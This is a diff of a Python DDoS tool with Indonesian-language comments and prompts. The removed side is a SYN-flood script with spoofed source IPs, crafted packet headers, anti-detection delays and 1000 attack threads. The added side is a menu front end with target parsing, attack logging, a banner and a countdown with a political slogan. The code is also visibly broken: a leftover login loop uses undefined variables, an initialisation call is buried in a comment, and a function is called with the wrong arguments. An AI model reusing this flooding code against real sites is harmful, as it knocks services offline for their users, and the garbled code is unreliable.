@@ -1,30 +1,45 @@
+# -*- coding: utf-8 -*-  
+#! /usr/bin/python3.11 -sP
 import os
-import sys
-import socket
-import random
-import threading
-import struct
+import requests
+import datetime
+import asyncio
+import validators
+from urllib.parse import urlparse
+from sys import stdout
+from colorama import Fore, Style, init
+import logging 
 import time
-import argparse
+# Inisialisasi Colorama dan Logging                                                                                                        init(autoreset=True)
+                                                                                                                                           # Pengaturan Logging yang benar
+logging.basicConfig(
+    filename='attack.log',
+    level=logging.INFO,
+    format='%(asctime)s - %(levelname)s - %(message)s',  # Perbaiki dari levellevel menjadi levelname                                          datefmt='%Y-%m-%d %H:%M:%S'
+)
 
+# Fungsi untuk Logging Informasi Serangan
+def log_attack_status(message, level='info', print_to_terminal=True):
+    if level == 'info':
+        my_regex = r"\Afoo"
+        logging.info(message)
+        if print_to_terminal:
+            print(f"{Fore.CYAN}|    [INFO] {message.ljust(63)}|")
+    elif level == 'error':
+        logging.error(message)
+        if print_to_terminal:
+            print(f"{Fore.RED}|    [ERROR] {message.ljust(63)}|")
+    elif level == 'warning':
+        logging.warning(message)
+        if print_to_terminal:
+            print(f"{Fore.YELLOW}|    [WARNING] {message.ljust(63)}|")
+      
 
-attemps = 0
-os.system("clear")   
-print("""
-\033[31m╔═══════════════════════════════════════════════════════════════════════╗
-\033[31m║\033[36m                                                                       \033[31m║
-\033[31m║\033[36m    ╔\033[93m█████\033[36m╗╔\033[93m█████\033[36m╗  ╔\033[93m█\033[36m╗╔\033[93m█\033[36m╗    ╔\033[93m█\033[36m╗╔\033[93m██████\033[36m╗ ╔\033[93m███\033[36m╗    ╔\033[93m█\033[36m╗╔\033[93m█████\033[36m╗ ╔\033[93m█\033[36m╗      \033[31m║
-\033[31m║\033[36m    ║\033[93m█\033[36m╔═══╝║\033[93m█\033[36m╔══╗\033[93m█\033[36m║ ║\033[93m█\033[36m║║\033[93m█\033[36m║   ║\033[93m█\033[36m║ ║\033[93m█\033[36m╔══╗\033[93m█\033[36m║ ║\033[93m█\033[36m║\033[93m█\033[36m║    ║\033[93m█\033[36m║║\033[93m█\033[36m║  ║\033[93m█\033[36m║║\033[93m█\033[36m║      \033[31m║
-\033[31m║\033[36m    ║\033[93m█\033[36m║    ║\033[93m█\033[36m║   ║\033[93m█\033[36m║║\033[93m█\033[36m║║\033[93m█\033[36m║  ║\033[93m█\033[36m║ ║\033[93m█\033[36m║    ║\033[93m█\033[36m║║\033[93m█\033[36m║║\033[93m█\033[36m║   ║\033[93m█\033[36m║║\033[93m█\033[36m║  ║\033[93m█\033[36m║║\033[93m█\033[36m║      \033[31m║
-\033[31m║\033[36m    ║\033[93m█\033[36m║    ║\033[93m█\033[36m║   ║\033[93m█\033[36m║║\033[93m█\033[36m║║\033[93m█\033[36m║ ║\033[93m█\033[36m║  ║\033[93m█\033[36m║    ║\033[93m█\033[36m║║\033[93m█\033[36m║ ║\033[93m█\033[36m║  ║\033[93m█\033[36m║║\033[93m█\033[36m║  ║\033[93m█\033[36m║║\033[93m█\033[36m║      \033[31m║
-\033[31m║\033[36m    ║\033[93m█████\033[36m╗║\033[93m█\033[36m║  ║\033[93m█\033[36m║ ║\033[93m█\033[36m║║\033[93m████\033[36m═╝  ║\033[93m█\033[36m║    ║\033[93m█\033[36m║║\033[93m█\033[36m║  ║\033[93m█\033[36m║ ║\033[93m█\033[36m║║\033[93m█\033[36m║  ║\033[93m█\033[36m║║\033[93m█\033[36m║      \033[31m║
-\033[31m║\033[36m    ╚═══╗\033[93m█\033[36m║║\033[93m█████\033[36m╗  ║\033[93m█\033[36m║║\033[93m█\033[36m╔══\033[93m█\033[36m╗  ║\033[93m█\033[36m║    ║\033[93m█\033[36m║║\033[93m█\033[36m║   ║\033[93m█\033[36m║║\033[93m█\033[36m║║\033[93m█\033[36m║  ║\033[93m█\033[36m║║\033[93m█\033[36m║      \033[31m║
-\033[31m║\033[36m        ║\033[93m█\033[36m║║\033[93m█\033[36m╔══╗\033[93m█\033[36m║ ║\033[93m█\033[36m║║\033[93m█\033[36m║  ║\033[93m█\033[36m║ ║\033[93m████████\033[36m║║\033[93m█\033[36m║    ║\033[93m█\033[36m║\033[93m█\033[36m║║\033[93m█\033[36m║  ║\033[93m█\033[36m║║\033[93m█\033[36m║      \033[31m║
-\033[31m║\033[36m    ║\033[93m█████\033[36m║║\033[93m█\033[36m║   ║\033[93m█\033[36m║║\033[93m█\033[36m║║\033[93m█\033[36m║   ║\033[93m█\033[36m║║\033[93m█\033[36m╔════╗\033[93m█\033[36m║║\033[93m█\033[36m║    ║\033[93m███\033[36m║║\033[93m█████\033[36m║ ║\033[93m█\033[36m║      \033[31m║
-\033[31m║\033[36m    ╚═════╝╚═╝   ╚═╝╚═╝╚═╝   ╚═╝╚═╝    ╚═╝╚═╝    ╚═══╝╚═════╝ ╚═╝      \033[31m║
-\033[31m║\033[36m                                                                       \033[31m║
-\033[31m╚═══════════════════════════════════════════════════════════════════════╝
-""")
+# Fungsi untuk Menampilkan Header HUDAIRUL-AQSHA dengan Warna
+def display_header():
+    header_lines = [
+        
+    ]
 while attemps < 100:
     print("\033[104m┌[Black-Army•••")
     username = input("└> Enter your username: \033[32m")
@@ -39,104 +54,76 @@ while attemps < 100:
         attemps += 1
         continue
 
-# Random IP Spoofing
-def random_ip():
-    return f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
+    # Tampilkan header dengan warna
+    for line in header_lines:
+        print(line)
 
-# Random port generator to make it harder to block specific port ranges
-def random_port():
-    return random.randint(1024, 65535)
+    # Versi dan URL
+    print(f"{Fore.WHITE}{Style.BRIGHT}{' ' * 57}v.1.0")
+    print(f"{Fore.CYAN}{Style.BRIGHT}{' ' * 16}https://github.com/Kodekeras24/HDR-DD0S.git")
+    print(f"{Fore.CYAN}|{'=' * 74}|")
 
-# Generate a random TCP sequence number
-def random_seq():
-    return random.randint(0, 4294967295)
+# Fungsi untuk Meminta Input dari Pengguna dengan Tampilan Rapi
+def get_user_input(prompt_message):
+    print(f"{Fore.GREEN}|{' ' * 4}[?] {prompt_message.ljust(63)}|")
+    print(f"{Fore.GREEN}|{'=' * 74}|")
+    return input(f"{Fore.YELLOW}{' ' * 4}> ").strip()
 
-# Generate a random TCP window size
-def random_window_size():
-    return random.randint(1024, 65535)
-
-# Create a fake/custom IP header
-def create_ip_header(source_ip, dest_ip):
-    ip_header = struct.pack('!BBHHHBBH4s4s',
-                            69,  # Version and header length (IPv4, 5 * 32 bits = 20 bytes)
-                            0,   # Type of service
-                            40,  # Total length
-                            random.randint(0, 65535),  # Identification
-                            0,   # Flags and Fragment Offset
-                            255, # Time to live
-                            socket.IPPROTO_TCP,  # Protocol
-                            0,   # Header checksum (leave as 0, calculated by kernel)
-                            socket.inet_aton(source_ip),  # Source IP
-                            socket.inet_aton(dest_ip))    # Destination IP
-    return ip_header
-
-# Create a TCP header with SYN flag set
-def create_tcp_header(source_port, dest_port):
-    tcp_header = struct.pack('!HHLLBBHHH',
-                            source_port,  # Source port
-                            dest_port,    # Destination port
-                            random_seq(),  # Sequence number
-                            0,            # Acknowledgment number
-                            80,           # Data offset and Reserved (TCP Header length)
-                            2,            # Flags (SYN flag set)
-                            random_window_size(),  # Window size
-                            0,            # Checksum (leave as 0, calculated by kernel)
-                            0)            # Urgent pointer
-    return tcp_header
-
-
-# SYN Flood Attack with IP Spoofing and randomized packet structure
-def syn_flood(target_ip, target_port):
+# Fungsi Countdown untuk Menampilkan Waktu Serangan
+def countdown(t):
+    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
     while True:
-        try:
-            # Create raw socket
-            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
-            # Spoofed source IP
-            source_ip = random_ip()
-            dest_ip = target_ip
-            # Random source port to avoid rate-limiting on a fixed port
-            source_port = random_port()
-            # Create IP and TCP headers
-            ip_header = create_ip_header(source_ip, dest_ip)
-            tcp_header = create_tcp_header(source_ip, dest_ip, source_port, target_port)
-            # Packet = IP header + TCP header
-            packet = ip_header + tcp_header
-            # Send the SYN packet
-            s.sendto(packet, (dest_ip, 0))
-            print(f"Sent SYN packet from {source_ip}:{source_port} to {dest_ip}:{target_port}")
-            # Randomize the delay between packets (anti-rate limiting)
-            time.sleep(random.uniform(0.1, 1.5))  # Add delay between 0.1 to 1.5 seconds to avoid detection
-        except Exception as e:
-            print(f"Error: {e}")
+        remaining_time = (until - datetime.datetime.now()).total_seconds()
+        if remaining_time > 1:
+            time.sleep(1),
+            stdout.flush()
+            stdout.write(f"\r{Fore.BLUE}|  [*] {Fore.YELLOW}HUDAIRUL AQSHA {Fore.CYAN}FOR THE INDEPENDENCE OF PALESTINE  {Fore.RED}{remaining_time:.2f}  {Fore.BLUE}CAT {' ' * 26}|")
+            stdout.write(f"\r{Fore.YELLOW}|  [*] {Fore.CYAN}HUDAIRUL AQSHA {Fore.BLUE}FOR THE INDEPENDENCE OF PALESTINE  {Fore.WHITE}{remaining_time:.2f}  {Fore.MAGENTA}CAT {' ' * 26}|")
+            stdout.write(f"\r{Fore.RED}|  [*] {Fore.WHITE}HUDAIRUL AQSHA {Fore.BLUE}FOR THE INDEPENDENCE OF PALESTINE  {Fore.YELLOW}{remaining_time:.2f}  {Fore.RED}CAT {' ' * 26}|")
+        else:
+            stdout.flush()
+            stdout.write(f"\r{Fore.RED}|  [*]  {Fore.YELLOW}חודאירול אקשה    {Fore.CYAN}התקפה נעשתה!{' ' * 53}|\n")
+            print(f"{Fore.CYAN}|{'=' * 74}|")
+            return
 
-# Function to resolve domain to IP using nslookup
-def resolve_domain(domain):
-    try:
-        return socket.gethostbyname(domain)
-    except socket.gaierror as e:
-        print(f"Could not resolve domain {domain}: {e}")
-        return None
+# Validasi URL dan Parsing Target
+def get_target(url):
+    if not validators.url(url):
+        log_attack_status(f"URL tidak valid: {url}", level='error')
+        raise ValueError(f"URL tidak valid: {url}")
 
-# Main function to run the attack
-def main():
-    # Set up argument parsing
-    parser = argparse.ArgumentParser(description='Perform SYN Flood DDoS attack with IP Spoofing and Proxies.')
-    parser.add_argument('-u', '--url', type=str, required=True, help='Target website URL')
-    parser.add_argument('-p', '--port', type=int, default=80, help='Target port (default is 80 for HTTP)')
-    args = parser.parse_args()
+    target = {
+        'uri': urlparse(url).path or "/",
+        'host': urlparse(url).netloc,
+        'scheme': urlparse(url).scheme,
+        'port': urlparse(url).netloc.split(":")[1] if ":" in urlparse(url).netloc else ("443" if urlparse(url).scheme == "https" else "80")
+    }
+    log_attack_status(f"Target diperoleh: {target['host']} ({target['scheme']}://{target['host']}:{target['port']}{target['uri']})")
+    return target
 
-    # Resolve the target domain to IP
-    target_ip = resolve_domain(args.url)
-    if not target_ip:
-        print(f"Error: Could not resolve the target URL: {args.url}")
-        return
-    print(f"Resolved {args.url} to IP: {target_ip}")
+# Fungsi Serangan Utama
+def launch_attack(target_url, duration):
+    target = get_target(target_url)
 
-    # Launch multiple threads for more attack intensity
-    threads = 1000  # Increase for higher load
-    for _ in range(threads):
-        thread = threading.Thread(target=syn_flood, args=(target_ip, args.port))
-        thread.start()
+    # Inisialisasi Serangan dan Waktu Serangan
+    log_attack_status(f"Meluncurkan serangan ke {target['host']} untuk {duration} detik...")
+    countdown(duration)
 
 if __name__ == "__main__":
-    main()
+    # Tampilkan Header
+    display_header()
+
+    # Prompt untuk input dari pengguna dengan tampilan yang rapi
+    target_url = get_user_input("Masukkan target URL:   ")
+    while not validators.url(target_url):
+        print(f"{Fore.RED}|    [ERROR] URL tidak valid. Coba lagi.{' ' * 37}|")
+        print(f"{Fore.CYAN}|{'=' * 74}|")
+        target_url = get_user_input("Masukkan target URL:")
+
+    try:
+        attack_duration = int(get_user_input("Masukkan durasi serangan (detik):"))
+    except ValueError:
+        attack_duration = 60  # Default durasi
+
+    # Luncurkan serangan
+    launch_attack(target_url, attack_duration)
